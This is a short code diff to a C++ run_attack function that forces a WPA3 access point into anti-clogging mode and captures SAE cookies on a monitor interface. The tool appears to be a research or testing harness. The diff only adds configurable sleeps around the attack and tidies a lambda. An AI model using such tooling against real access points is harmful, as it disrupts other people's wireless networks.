@@ -144,6 +144,7 @@ void run_attack(RunStatus &rs) {
 	att->set_iface_up();
 
 	//  force AP into ACM mode
+	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	trigger_acm(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), acm_pause_millisec, trigger_count, sae_params.value());
 	rs.process_manager.write_log_all("@AKM_trigger");
@@ -151,7 +152,7 @@ void run_attack(RunStatus &rs) {
 	rs.start_observers();
 
 	CookieStore store;
-	thread capture_thread([&]() {
+	thread capture_thread([&] {
 		try {
 			capture_cookies(att.get_mon_iface(), ap.get(SK::mac), store);
 		} catch(const exception &e) {
@@ -176,8 +177,8 @@ void run_attack(RunStatus &rs) {
 		throw;
 	}
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
-
 	if(capture_thread.joinable()) capture_thread.join();
+	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 	ap->disconnect();
 }
 
